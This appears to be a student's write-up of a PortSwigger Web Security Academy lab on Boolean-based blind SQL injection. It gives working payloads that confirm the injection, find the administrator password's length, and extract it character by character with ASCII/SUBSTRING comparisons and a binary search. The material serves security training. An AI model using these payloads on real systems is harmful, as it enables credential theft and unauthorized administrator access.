# 🔐 Blind SQL Injection Lab — Password Extraction

## Platform
Lab completed on:
- PortSwigger Web Security Academy

## Objective
Exploit a Boolean-Based Blind SQL Injection vulnerability to extract the administrator password from the database and log in as the administrator.

The application does not display SQL query results directly. Instead, we rely on a response indicator.

Indicator used in this lab:
"Welcome back"

If the injected condition is TRUE, the message "Welcome back" appears in the response.

---

## Step 1 — Confirm SQL Injection

TRUE condition
```
' AND 1=1-- -
```
Response:
Welcome back

FALSE condition
```
' AND 1=2-- -
```
Response:
No "Welcome back"

This confirms Boolean-Based Blind SQL Injection.

---

## Step 2 — Determine Administrator Password Length

Payload:
```
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20-- -
```
or
```
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>=20-- -
```
When the condition returns TRUE, the password length is identified.

Example result:
Password length = 20

---

## Step 3 — Extract Password Characters

Use SUBSTRING() and ASCII() to extract characters one by one.

Example payload:
```
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)) > 79-- -
```
If TRUE → ASCII value is greater than 79.

## Binary Search Optimization

Instead of brute forcing characters sequentially, binary search is used.

ASCII range:
32 – 126

Binary search process example:

32–126  
>79  
80–126  
>103  
80–103  
>91  
92–103  
...  

Eventually the exact ASCII value is identified.

Example:

ASCII 115 → s

This process is repeated for each character position until the full password is extracted.

---

## Extraction Logic

1. Identify password length  
2. Extract characters using SUBSTRING()  
3. Compare ASCII values  
4. Use binary search to minimize requests  
5. Reconstruct full password  

---

## SQL Functions Used

LENGTH() → Determine password length  
SUBSTRING() → Extract character position  
ASCII() → Convert character to numeric value
